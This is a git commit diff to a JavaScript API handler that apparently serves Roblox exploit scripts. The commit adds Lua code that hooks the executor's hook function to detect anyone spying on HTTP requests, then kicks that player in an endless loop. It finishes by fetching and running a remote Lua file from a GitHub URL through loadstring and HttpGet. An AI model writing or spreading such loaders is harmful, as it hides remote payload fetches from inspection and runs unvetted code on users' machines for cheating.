0f551a983e580bda2c9dd199ba87b0f2efcb87c8
Roblox Scripts <gregyheport@gmail.com>
2025-12-12 09:59:53 +0800

    Update loader.js

--- api/loader.js
+++ api/loader.js
@@ -29,7 +29,25 @@ export default function handler(req, res) {
     res.setHeader('Pragma', 'no-cache');
     res.setHeader('Expires', '0');
 
-    const script = ``;
+    const script = `
+    local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local RunService = game:GetService("RunService")
+
+local a;
+a = hookfunction(hookfunction, newcclosure(function(args, args2)
+    if args == game.HttpGet then
+    LocalPlayer:Kick("Why are you using http spy chill bro")
+    task.wait(0.2)
+    while true do 
+    LocalPlayer:Kick("Why are you using http spy chill bro")
+  end
+   return warn
+    end
+    return a(args, args2)
+end))
+
+    loadstring(game:HttpGet("https://github.com/Rawbr10/bloodball/raw/refs/heads/main/block.lua"))()`;
 
     return res.status(200).send(script);
 }
